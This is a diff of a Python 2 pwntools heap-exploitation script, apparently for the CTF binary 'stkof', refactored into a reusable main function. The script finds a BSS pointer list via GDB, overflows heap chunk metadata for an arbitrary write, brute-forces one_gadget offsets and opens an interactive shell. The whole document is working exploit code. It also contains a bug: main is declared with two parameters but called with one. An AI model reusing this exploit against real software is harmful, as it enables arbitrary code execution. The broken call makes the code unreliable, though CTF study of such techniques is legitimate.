@@ -1,5 +1,6 @@
 from pwn import *
 from GdbWrapper import GdbWrapper
+from one_gadget import generate_one_gadget
 
 context.log_level = "info"
 context.endian = "little"
@@ -31,17 +32,18 @@ def Free(index):
     if "OK" not in tmp and "FAIL" not in tmp:
         return tmp
 
-if __name__ == "__main__":
-    #test env
-    binary = "./bins/a679df07a8f3a8d590febad45336d031-stkof"
+def main(binary, poc):
+    # test env
     bss_ptrlist = None
     free_index = None
     free_try = 2
+    elf = ELF(binary)
+    assert elf.arch == "amd64" and ("2.26" in elf.libc.path or "2.27" in elf.libc.path)
     while bss_ptrlist == None:
-    #find bss ptr
-        io = process("./bins/a679df07a8f3a8d590febad45336d031-stkof")
+        # find bss ptr
+        io = process(binary)
         gdbwrapper = GdbWrapper(io.pid)
-        #gdb.attach(io)
+        # gdb.attach(io)
         Alloc(0x400)
         Edit(1, 0x400, "a" * 0x400)
         Alloc(0x400)
@@ -69,12 +71,12 @@ if __name__ == "__main__":
                                 if binary.split("/")[-1] in y["PATH"]:
                                     ptr_addr.append(y["ADDR"])
                                     break
-                        if(len(ptr_addr) != ptr_addr_length):
+                        if (len(ptr_addr) != ptr_addr_length):
                             break
                 if len(ptr_addr) != ptr_addr_length:
                     break
             index += 1
-            if(index == 5):
+            if (index == 5):
                 break
         bss_ptrlist = sorted(ptr_addr)[0]
         io.close()
@@ -84,7 +86,7 @@ if __name__ == "__main__":
         Alloc(0x400)
         Alloc(0x400)
         Free(free_try)
-        Edit(free_try -1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(0x12345678))
+        Edit(free_try - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(0x12345678))
         try:
             Alloc(0x400)
             Alloc(0x400)
@@ -92,13 +94,11 @@ if __name__ == "__main__":
             free_index = free_try
         free_try += 1
         io.close()
-    #arbitrary write
-    from one_gadget import generate_one_gadget
+    # arbitrary write
     libc = ELF(binary).libc
-    one_gadget_offsets =generate_one_gadget(libc.path)
+    one_gadget_offsets = generate_one_gadget(libc.path)
     for one_gadget_offset in one_gadget_offsets:
         io = process(binary)
-        elf = ELF(binary)
         libc = elf.libc
         gdbwrapper = GdbWrapper(io.pid)
         Alloc(0x400)
@@ -119,9 +119,12 @@ if __name__ == "__main__":
         Free(1)
         try:
             io.sendline("id")
-            log.info(io.readline(timeout = 3))
-        except Exception,e:
+            log.info(io.readline(timeout=3))
+        except Exception, e:
             io.close()
             continue
         io.interactive()
 
+if __name__ == "__main__":
+    binary = "./bins/a679df07a8f3a8d590febad45336d031-stkof"
+    main(binary)
